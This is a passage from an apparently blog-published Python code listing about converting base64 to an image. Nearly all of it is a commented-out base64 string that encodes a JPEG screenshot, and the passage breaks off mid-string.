base64转为图片</span><br><span class="line">        try:</span><br><span class="line">            # a = &quot;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